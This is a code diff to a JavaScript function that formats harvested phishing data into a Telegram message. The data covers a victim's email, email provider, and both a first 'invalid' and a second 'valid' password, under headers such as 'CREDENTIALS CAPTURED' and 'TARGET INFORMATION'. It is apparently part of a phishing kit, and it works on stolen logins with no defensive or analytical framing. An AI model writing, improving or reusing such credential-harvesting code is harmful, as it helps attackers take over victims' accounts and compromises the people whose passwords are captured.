@@ -110,19 +110,33 @@ const composeTelegramMessage = (data) => {
 
     let passwordSection;
     if (hasTwoStepData) {
-        passwordSection = `🔑 First (invalid): \`${firstAttemptPassword}\`\n🔑 Second (valid): \`${secondAttemptPassword}\``;
+        passwordSection = `🔐 **CREDENTIALS CAPTURED**
+┌─────────────────────────────────
+│ 🚫 **Invalid Password:** \`${firstAttemptPassword}\`
+│ ✅ **Valid Password:** \`${secondAttemptPassword}\`
+└─────────────────────────────────`;
     } else {
-        passwordSection = `🔑 Password: \`${password || 'Not captured'}\``;
+        passwordSection = `🔐 **CREDENTIALS CAPTURED**
+┌─────────────────────────────────
+│ 🔑 **Password:** \`${password || 'Not captured'}\`
+└─────────────────────────────────`;
     }
 
-    return `
-*🔐 PARISRESULTS 🔐*
+    return `👤 **TARGET INFORMATION**
+┌─────────────────────────────────
+│ 📧 **Email:** \`${email || 'Not captured'}\`
+│ 🏢 **Platform:** *${provider || 'Others'}*
+│ ⏰ **Captured:** ${new Date().toLocaleString('en-US', { 
+        timeZone: 'UTC',
+        year: 'numeric',
+        month: 'short', 
+        day: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit'
+    })} UTC
+└─────────────────────────────────
 
-*ACCOUNT DETAILS*
-- 📧 Email: \`${email || 'Not captured'}\`
-- 🏢 Provider: *${provider || 'Others'}*
-- ${passwordSection}
-`;
+${passwordSection}`;
 };
 
 /**
